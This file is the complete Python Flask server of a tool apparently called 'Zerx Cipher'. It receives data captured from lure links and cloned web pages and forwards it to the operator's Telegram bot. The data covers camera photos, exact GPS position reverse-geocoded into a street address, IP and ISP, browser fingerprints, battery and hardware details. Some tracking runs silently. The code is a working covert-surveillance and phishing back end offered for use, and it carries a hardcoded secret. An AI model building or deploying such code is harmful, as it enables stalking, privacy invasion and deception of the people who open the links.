#!/usr/bin/env python3
# server.py — Flask backend for Zerx Cipher v1.6.1
# Consolidated tracking — ONE message per capture

from flask import Flask, request, jsonify, Response
import hmac, hashlib, time, sqlite3, os, json, base64
from datetime import datetime, timezone

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024

LINK_SECRET = os.environ.get("LINK_SECRET", "zE4o-jRvHuJiSbw-bg72aeygBJ-In52YqBj_oV-PuYoYlmrIhf_jhjzThgCmShLt")
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
OWNER_ID    = os.environ.get("OWNER_ID", "5748713981")
DB_PATH     = os.environ.get("DB_PATH", "zerx.db")
DIVIDER     = "━━━━━━━━━━━━━━━━"
FOOTER      = "⚡ Developed by: @zerxofficial"

_CLONES = {}
_PREVIEWS = {}
_LAST_EVENT = {}

ALLOWED_ORIGINS = {
    "https://best-free-ai-tool.netlify.app",
    "https://best-free-ai-tools.netlify.app",
    "https://subtle-sunburst-1d934f.netlify.app",
}

@app.after_request
def add_cors(resp):
    origin = request.headers.get("Origin", "")
    if origin in ALLOWED_ORIGINS or origin.endswith(".netlify.app"):
        resp.headers["Access-Control-Allow-Origin"] = origin
        resp.headers["Vary"] = "Origin"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        resp.headers["Access-Control-Max-Age"] = "86400"
    return resp

def _sign(payload: str) -> str:
    return hmac.new(LINK_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()[:32]

def _flag_emoji(cc):
    if not cc or len(cc) != 2:
        return ""
    try:
        return chr(0x1F1E6 + ord(cc[0].upper()) - 65) + chr(0x1F1E6 + ord(cc[1].upper()) - 65)
    except Exception:
        return ""

def _send_telegram_text(chat_id, text):
    import requests as rq
    try:
        rq.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": text,
                  "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=12,
        )
    except Exception as e:
        print(f"telegram text failed: {e}")

def _send_telegram_photo(chat_id, b64_data, caption):
    import requests as rq
    try:
        if "," in b64_data:
            b64_data = b64_data.split(",", 1)[1]
        raw = base64.b64decode(b64_data)
        rq.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            files={"photo": ("capture.jpg", raw)},
            data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
            timeout=20,
        )
    except Exception as e:
        print(f"telegram photo failed: {e}")

def _reverse_geocode(lat, lon):
    """Server-side reverse geocoding using Nominatim + BigDataCloud fallback."""
    import requests as rq
    # Try Nominatim first
    try:
        r = rq.get(
            f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&addressdetails=1&zoom=18",
            headers={"User-Agent": "ZerxCipher/1.0"},
            timeout=5
        )
        if r.status_code == 200:
            d = r.json()
            addr = d.get("address", {})
            return {
                "display": d.get("display_name", ""),
                "road": addr.get("road") or addr.get("pedestrian") or "",
                "house": addr.get("house_number", ""),
                "suburb": addr.get("suburb") or addr.get("neighbourhood", ""),
                "city": addr.get("city") or addr.get("town") or addr.get("village", ""),
                "county": addr.get("county", ""),
                "state": addr.get("state", ""),
                "postcode": addr.get("postcode", ""),
                "country": addr.get("country", ""),
                "countryCode": addr.get("country_code", "").upper(),
            }
    except Exception:
        pass
    # Fallback: BigDataCloud
    try:
        r = rq.get(
            f"https://api.bigdatacloud.net/data/reverse-geocode-client?latitude={lat}&longitude={lon}&localityLanguage=en",
            timeout=5
        )
        if r.status_code == 200:
            d = r.json()
            return {
                "display": f"{d.get('city') or d.get('locality', '')}, {d.get('principalSubdivision', '')}, {d.get('countryName', '')}",
                "road": "",
                "city": d.get("city") or d.get("locality", ""),
                "state": d.get("principalSubdivision", ""),
                "country": d.get("countryName", ""),
                "countryCode": d.get("countryCode", ""),
                "postcode": "",
            }
    except Exception:
        pass
    return None

def _mark(uid, typ):
    _LAST_EVENT.setdefault(uid, {})[typ] = time.time()

def _recent(uid, typ, window=30):
    last = _LAST_EVENT.get(uid, {})
    return last.get(typ) and (time.time() - last[typ]) < window

# ============================================================
# VERIFY
# ============================================================
@app.route("/api/verify", methods=["GET", "OPTIONS"])
def api_verify():
    if request.method == "OPTIONS":
        return ("", 204)
    uid_s = request.args.get("id", "")
    tok   = request.args.get("t", "")
    if not uid_s.isdigit() or not tok:
        return jsonify({"ok": False, "reason": "missing"}), 403
    uid = int(uid_s)
    try:
        exp_s, sig = tok.split(".", 1)
        exp = int(exp_s)
    except Exception:
        return jsonify({"ok": False, "reason": "malformed"}), 403
    if exp < int(time.time()):
        return jsonify({"ok": False, "reason": "expired"}), 403
    expected = _sign(f"{uid}.{exp}")
    if not hmac.compare_digest(expected, sig):
        return jsonify({"ok": False, "reason": "bad_signature"}), 403
    return jsonify({"ok": True, "uid": uid})

# ============================================================
# CLONE STORE
# ============================================================
@app.route("/api/clone-store", methods=["POST"])
def clone_store():
    try:
        data = request.get_json(force=True) or {}
        slug = data.get("slug", "")
        html = data.get("html", "")
        if not slug or not html:
            return jsonify({"ok": False}), 400
        _CLONES[slug] = html
        try:
            con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
            con.execute("""CREATE TABLE IF NOT EXISTS clone_html(
                             slug TEXT PRIMARY KEY, html TEXT, created TEXT)""")
            con.execute("INSERT OR REPLACE INTO clone_html(slug,html,created) VALUES(?,?,?)",
                        (slug, html, datetime.now(timezone.utc).isoformat()))
            con.commit()
            con.close()
        except Exception:
            pass
        return jsonify({"ok": True}), 200
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/api/clone/<slug>", methods=["GET"])
def api_clone(slug):
    html = _CLONES.get(slug)
    if html:
        return Response(html, mimetype="text/html; charset=utf-8")
    try:
        con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
        con.row_factory = sqlite3.Row
        row = con.execute("SELECT html FROM clone_html WHERE slug=?", (slug,)).fetchone()
        con.close()
        if row:
            return Response(row["html"], mimetype="text/html; charset=utf-8")
    except Exception:
        pass
    return "Not found", 404

# ============================================================
# PREVIEW STORE
# ============================================================
@app.route("/api/preview-store", methods=["POST", "OPTIONS"])
def preview_store():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
        slug = (data.get("slug") or "").strip()
        html = data.get("html") or ""
        if not slug or not html:
            return jsonify({"ok": False, "error": "missing slug or html"}), 400
        _PREVIEWS[slug] = html
        try:
            con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
            con.execute("""CREATE TABLE IF NOT EXISTS preview_html(
                             slug TEXT PRIMARY KEY, html TEXT, created TEXT)""")
            con.execute("INSERT OR REPLACE INTO preview_html(slug,html,created) VALUES(?,?,?)",
                        (slug, html, datetime.now(timezone.utc).isoformat()))
            con.commit()
            con.close()
        except Exception:
            pass
        return jsonify({"ok": True, "slug": slug}), 200
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/preview/<slug>", methods=["GET"])
def preview_view(slug):
    html = _PREVIEWS.get(slug)
    if html:
        return Response(html, mimetype="text/html; charset=utf-8")
    try:
        con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
        con.row_factory = sqlite3.Row
        row = con.execute("SELECT html FROM preview_html WHERE slug=?", (slug,)).fetchone()
        con.close()
        if row:
            return Response(row["html"], mimetype="text/html; charset=utf-8")
    except Exception:
        pass
    return Response(
        "<!doctype html><meta charset='utf-8'><title>Not found</title>"
        "<body style='font:14px -apple-system,Segoe UI,sans-serif;background:#0e0e11;"
        "color:#eee;display:flex;align-items:center;justify-content:center;"
        "height:100vh;margin:0'><div>Preview not found or expired.</div></body>",
        status=404, mimetype="text/html; charset=utf-8"
    )

# ============================================================
# TRACK — Silent for heartbeat/location_update, camera photos
# ============================================================
@app.route("/track", methods=["POST", "OPTIONS"])
def track():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}

    uid = str(data.get("uid", "")).strip()
    typ = data.get("type", "unknown")
    payload = data.get("data", {}) or {}
    silent = data.get("silent", False)

    if not uid.isdigit():
        return jsonify({"ok": False}), 400
    if not BOT_TOKEN:
        return jsonify({"ok": True}), 200

    # Silent types — no Telegram message
    if silent or typ in ("heartbeat", "location_update", "sensor"):
        return jsonify({"ok": True, "silent": True}), 200

    now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")

    # Camera photos (individual frames from consolidated script)
    if typ == "camera" and isinstance(payload, dict) and payload.get("image"):
        if _recent(uid, "camera", 5):
            return jsonify({"ok": True, "dup": True}), 200
        cam_label = payload.get("camera", "unknown")
        caption = (
            f"📸 <b>Camera — {cam_label}</b>\n"
            f"{DIVIDER}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_photo(uid, payload["image"], caption)
        _mark(uid, "camera")
        return jsonify({"ok": True}), 200

    # Location (initial GPS from consolidated script — sent as part of consolidated msg)
    if typ == "location" and isinstance(payload, dict):
        # This is now handled by /track-consolidated, so just log it
        return jsonify({"ok": True, "consolidated": True}), 200

    # Device info — now handled by /track-consolidated
    if typ == "device_info":
        return jsonify({"ok": True, "consolidated": True}), 200

    # Other types that should be silent
    if typ in ("battery", "media_devices", "permissions", "storage", "clipboard", "precise_location"):
        return jsonify({"ok": True, "consolidated": True}), 200

    # Generic fallback
    text = (
        f"📡 <b>{typ}</b>\n"
        f"{DIVIDER}\n"
        f"<code>{json.dumps(payload)[:900]}</code>\n"
        f"📅 {now}\n"
        f"{DIVIDER}\n{FOOTER}"
    )
    _send_telegram_text(uid, text)
    return jsonify({"ok": True}), 200

# ============================================================
# TRACK-CAMERA — Dedicated for camera photos
# ============================================================
@app.route("/track-camera", methods=["POST", "OPTIONS"])
def track_camera():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}

    uid = str(data.get("uid", "")).strip()
    b64_image = data.get("image", "")
    cam_label = data.get("camera", "unknown")
    if not uid.isdigit() or not b64_image:
        return jsonify({"ok": False}), 400
    if not BOT_TOKEN:
        return jsonify({"ok": True}), 200

    if _recent(uid, f"cam_{cam_label}", 5):
        return jsonify({"ok": True, "dup": True}), 200

    now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")
    caption = (
        f"📸 <b>Camera Capture — {cam_label}</b>\n"
        f"{DIVIDER}\n"
        f"📅 {now}\n"
        f"{DIVIDER}\n{FOOTER}"
    )
    _send_telegram_photo(uid, b64_image, caption)
    _mark(uid, f"cam_{cam_label}")
    return jsonify({"ok": True}), 200

# ============================================================
# TRACK-CONSOLIDATED — ONE message with all data
# ============================================================
@app.route("/track-consolidated", methods=["POST", "OPTIONS"])
def track_consolidated():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}

    uid = str(data.get("uid", "")).strip()
    capture_type = data.get("capture_type", "device_monitor")
    if not uid.isdigit():
        return jsonify({"ok": False}), 400
    if not BOT_TOKEN:
        return jsonify({"ok": True}), 200

    if _recent(uid, f"consolidated_{capture_type}", 10):
        return jsonify({"ok": True, "dup": True}), 200

    now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")

    device = data.get("device", {}) or {}
    network = data.get("network", {}) or {}
    gps = data.get("gps", {}) or {}
    battery = data.get("battery", {}) or {}
    fingerprint = data.get("fingerprint", {}) or {}

    # ── Reverse geocode GPS coordinates server-side ──
    geo_info = None
    if gps and gps.get("lat") and gps.get("lon"):
        geo_info = _reverse_geocode(gps["lat"], gps["lon"])

    # ── Format based on capture type ──
    if capture_type == "camera_link":
        text = _format_camera_link(device, network, now)
    elif capture_type == "location_link":
        text = _format_location_link(device, network, gps, geo_info, now)
    else:  # device_monitor
        text = _format_device_monitor(device, network, gps, geo_info, battery, fingerprint, now)

    _send_telegram_text(uid, text)
    _mark(uid, f"consolidated_{capture_type}")
    return jsonify({"ok": True}), 200

def _format_camera_link(device, network, now):
    ip = network.get("ip") or device.get("ip") or "?"
    country = network.get("country") or device.get("country") or "?"
    cc = network.get("countryCode") or device.get("countryCode") or ""
    platform = device.get("platform", "n/a")
    ua = device.get("ua", "n/a")
    city = network.get("city") or device.get("city") or "?"
    isp = network.get("isp") or device.get("isp") or "?"

    return (
        f"📸 <b>Camera Capture</b>\n"
        f"{DIVIDER}\n\n"
        f"🖥️ <b>Device</b>\n"
        f"   • Platform: {platform}\n"
        f"   • UA: {ua}\n\n"
        f"🌐 <b>Network</b>\n"
        f"   • IP: <code>{ip}</code>\n"
        f"   • ISP: {isp}\n"
        f"   • Location: {country} {_flag_emoji(cc)}\n"
        f"   • City: {city}\n\n"
        f"📅 {now}\n"
        f"{DIVIDER}\n{FOOTER}"
    )

def _format_location_link(device, network, gps, geo_info, now):
    ip = network.get("ip") or device.get("ip") or "?"
    platform = device.get("platform", "n/a")
    ua = device.get("ua", "n/a")

    lat = gps.get("lat") if gps else None
    lon = gps.get("lon") if gps else None
    acc = gps.get("acc") if gps else None

    if lat and lon:
        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
        maps_url = f"https://maps.google.com/?q={lat},{lon}"

        if geo_info:
            road = geo_info.get("road", "")
            city = geo_info.get("city", "")
            state = geo_info.get("state", "")
            country = geo_info.get("country", "")
            postcode = geo_info.get("postcode", "")
            display = geo_info.get("display", "")
            addr_parts = [p for p in [road, city, state, postcode] if p]
            addr_line = ", ".join(addr_parts) if addr_parts else display or "N/A"
        else:
            addr_line = "N/A"

        return (
            f"🌍 <b>Exact Location Captured</b>\n"
            f"{DIVIDER}\n\n"
            f"📍 <b>GPS Coordinates</b>\n"
            f"   • Lat: <code>{lat}</code>\n"
            f"   • Lon: <code>{lon}</code>\n"
            f"   • Accuracy: ±{round(acc) if isinstance(acc, (int, float)) else '?'}m\n\n"
            f"🏠 <b>Address</b>\n"
            f"   • {addr_line}\n\n"
            f"🗺 <b>Google Maps</b>\n"
            f"   • {maps_url}\n\n"
            f"🖥️ <b>Device</b>\n"
            f"   • Platform: {platform}\n"
            f"   • IP: <code>{ip}</code>\n\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
    else:
        # GPS not available, show IP-based location
        country = network.get("country") or device.get("country") or "?"
        cc = network.get("countryCode") or device.get("countryCode") or ""
        city = network.get("city") or device.get("city") or "?"
        isp = network.get("isp") or device.get("isp") or "?"
        ip_lat = network.get("lat") or device.get("lat")
        ip_lon = network.get("lon") or device.get("lon")

        maps_url = f"https://maps.google.com/?q={ip_lat},{ip_lon}" if ip_lat and ip_lon else ""

        return (
            f"🌍 <b>Location Capture</b>\n"
            f"{DIVIDER}\n\n"
            f"⚠️ GPS not available — showing IP-based location (approximate)\n\n"
            f"🌐 <b>Network Location</b>\n"
            f"   • IP: <code>{ip}</code>\n"
            f"   • ISP: {isp}\n"
            f"   • Country: {country} {_flag_emoji(cc)}\n"
            f"   • City: {city}\n"
            f"{f'   • Maps: {maps_url}\n' if maps_url else ''}\n"
            f"🖥️ <b>Device</b>\n"
            f"   • Platform: {platform}\n\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )

def _format_device_monitor(device, network, gps, geo_info, battery, fingerprint, now):
    ua = device.get("ua", "n/a")
    platform = device.get("platform", "n/a")
    lang = device.get("lang", "n/a")
    screen_res = device.get("screen", "n/a")
    viewport = device.get("viewport", "n/a")
    color_depth = device.get("colorDepth", "n/a")
    tz = device.get("tz", "n/a")
    cores = device.get("cores", "n/a")
    mem = device.get("mem", "n/a")
    touch = device.get("touch", "n/a")
    touch_points = device.get("touchPoints", "n/a")
    cookies = device.get("cookies", "n/a")
    url = device.get("url", "n/a")
    referrer = device.get("referrer", "none")

    # Fingerprint
    canvas_fp = device.get("canvasFp", "n/a")
    webgl_fp = device.get("webglFp", {})
    if isinstance(webgl_fp, dict):
        webgl_vendor = webgl_fp.get("vendor", "n/a")
        webgl_renderer = webgl_fp.get("renderer", "n/a")
    else:
        webgl_vendor = webgl_renderer = str(webgl_fp)
    audio_fp = fingerprint.get("audio", "n/a") if isinstance(fingerprint, dict) else "n/a"

    # Network
    ip = network.get("ip") or device.get("ip") or "?"
    country = network.get("country") or device.get("country") or "?"
    cc = network.get("countryCode") or device.get("countryCode") or ""
    region = network.get("region") or device.get("region") or "?"
    city = network.get("city") or device.get("city") or "?"
    isp = network.get("isp") or device.get("isp") or "?"
    asn = network.get("asn") or device.get("asn") or "?"
    ip_lat = network.get("lat") or device.get("lat")
    ip_lon = network.get("lon") or device.get("lon")

    # GPS
    gps_lat = gps.get("lat") if gps else None
    gps_lon = gps.get("lon") if gps else None
    gps_acc = gps.get("acc") if gps else None

    # Battery
    bat_level = battery.get("level", "n/a") if battery else "n/a"
    bat_charge = battery.get("charging", "n/a") if battery else "n/a"

    # Build location section
    if gps_lat and gps_lon:
        acc_line = f" (±{round(gps_acc)}m)" if isinstance(gps_acc, (int, float)) else ""
        maps_url = f"https://maps.google.com/?q={gps_lat},{gps_lon}"
        if geo_info:
            road = geo_info.get("road", "")
            geo_city = geo_info.get("city", "")
            state = geo_info.get("state", "")
            geo_country = geo_info.get("country", "")
            postcode = geo_info.get("postcode", "")
            addr_parts = [p for p in [road, geo_city, state, postcode, geo_country] if p]
            addr_line = ", ".join(addr_parts) if addr_parts else "N/A"
        else:
            addr_line = "N/A"

        location_section = (
            f"📍 <b>Exact GPS Location</b>\n"
            f"   • Coordinates: <code>{gps_lat}, {gps_lon}</code>{acc_line}\n"
            f"   • Address: {addr_line}\n"
            f"   • Maps: {maps_url}\n"
        )
    elif ip_lat and ip_lon:
        maps_url = f"https://maps.google.com/?q={ip_lat},{ip_lon}"
        location_section = (
            f"📍 <b>IP Location (approximate)</b>\n"
            f"   • Coordinates: <code>{ip_lat}, {ip_lon}</code>\n"
            f"   • Country: {country} {_flag_emoji(cc)}\n"
            f"   • City: {city}\n"
            f"   • Maps: {maps_url}\n"
            f"   ⚠️ GPS not available — IP-based estimate\n"
        )
    else:
        location_section = (
            f"📍 <b>Location</b>\n"
            f"   • Country: {country} {_flag_emoji(cc)}\n"
            f"   • City: {city}\n"
            f"   ⚠️ GPS not available\n"
        )

    return (
        f"📊 <b>Device Monitor Capture</b>\n"
        f"{DIVIDER}\n\n"
        f"🖥️ <b>Device &amp; Browser</b>\n"
        f"   • Platform: {platform}\n"
        f"   • UA: {ua}\n"
        f"   • Language: {lang}\n"
        f"   • Screen: {screen_res}\n"
        f"   • Viewport: {viewport}\n"
        f"   • Color Depth: {color_depth}\n"
        f"   • Touch: {touch} ({touch_points} pts)\n\n"
        f"🔒 <b>Fingerprint</b>\n"
        f"   • Canvas: <code>{canvas_fp}</code>\n"
        f"   • WebGL: {webgl_vendor} / {webgl_renderer}\n"
        f"   • Audio: <code>{audio_fp}</code>\n\n"
        f"🌐 <b>Network</b>\n"
        f"   • IP: <code>{ip}</code>\n"
        f"   • ISP: {isp}\n"
        f"   • ASN: {asn}\n\n"
        f"{location_section}\n"
        f"🔋 <b>Battery</b>\n"
        f"   • Level: {bat_level}\n"
        f"   • Charging: {bat_charge}\n\n"
        f"💾 <b>Hardware</b>\n"
        f"   • CPU: {cores} cores\n"
        f"   • RAM: {mem} GB\n"
        f"   • Timezone: {tz}\n\n"
        f"⚙️ <b>Other</b>\n"
        f"   • Cookies: {cookies}\n"
        f"   • Page: {url}\n"
        f"   • Referrer: {referrer}\n\n"
        f"📅 {now}\n"
        f"{DIVIDER}\n{FOOTER}"
    )

# ============================================================
# HEALTH
# ============================================================
@app.route("/health", methods=["GET"])
def health():
    return jsonify({
        "ok": True,
        "ts": datetime.now(timezone.utc).isoformat(),
        "version": "1.6.1",
        "endpoints": ["/api/verify", "/api/clone-store", "/api/clone/<slug>",
                      "/api/preview-store", "/preview/<slug>",
                      "/track", "/track-camera", "/track-consolidated", "/health"]
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    app.run(host="0.0.0.0", port=port)
